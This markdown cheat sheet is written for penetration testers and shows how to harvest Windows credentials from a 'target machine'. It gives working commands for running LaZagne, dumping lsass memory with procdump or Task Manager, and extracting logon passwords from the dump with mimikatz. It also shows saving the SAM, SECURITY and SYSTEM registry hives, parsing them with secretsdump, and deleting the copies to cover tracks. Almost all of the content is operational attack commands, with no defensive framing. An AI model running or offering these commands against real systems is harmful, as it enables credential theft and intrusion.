## Tools
* [LaZagne](https://github.com/AlessandroZ/LaZagne)
    ```batch
    laZagne.exe all
    ```

---
## Dumping Credentials

### Procdump & Mimikatz

Useful if AV cannot be disabled and does not block procdump.exe

1. On target machine
    * Via procdump.exe
        ```batch
        procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
        procdump64.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
        ```
    * Via Task manager
        * Open `Task Manager` -> Details -> lsass.exe -> (++right-button++) -> "Create dump file"
    
1. Retrieve file

1. On local machine (Windows)
    ```batch
    mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
    ```


### Impacket Secretsdump

1. On target machine
    ```batch
    mkdir c:\temp
    reg.exe save hklm\sam c:\temp\sam.save
    reg.exe save hklm\security c:\temp\security.save
    reg.exe save hklm\system c:\temp\system.save
    ```

1. Retrieve the files
    * See [Data Exfiltration](../../#data-exfiltration)

1. On local machine (~Kali)
    ```bash
    secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```
    
1. On target machine
    ```batch
    del c:\temp\sam.save
    del c:\temp\security.save
    del c:\temp\system.save
    rmdir c:\temp # Except when the "temp" folder already existed before Step 1. # Check if there are other contents in the folder
    ```


[^1]: [Pure Security](https://pure.security/dumping-windows-credentials/)
